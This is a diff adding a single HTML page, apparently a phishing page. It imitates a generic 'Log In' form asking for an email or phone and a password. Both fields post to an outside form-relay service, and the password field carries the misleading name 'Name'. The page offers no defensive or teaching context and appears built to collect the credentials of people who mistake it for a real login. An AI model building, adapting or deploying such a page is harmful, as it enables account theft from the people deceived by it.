@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>HTML Form to Mail</title>
+  <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+	<section>
+	  <div class="bg">
+	    <img src="bg.png">
+	  </div>
+  <div class="container">
+    <form action="https://formspree.io/f/mqkozakj" method="POST" id="my-form">
+      <div class="form-group">
+        <label for="email">Email or phon</label>
+        <input type="email" id="email" name="email">
+        
+      </div>
+      <div class="form-group">
+        <label for="Name">Password</label>
+        <input type="password"id="Name" name="Name">
+      </div>
+
+      <button type="submit" id="num2">Log In</button>
+    </form>
+  </div>
+  <div id="status"></div>
+</section>
+<script type="text/javascript" src="script.js"></script>
+</body>
+</html>
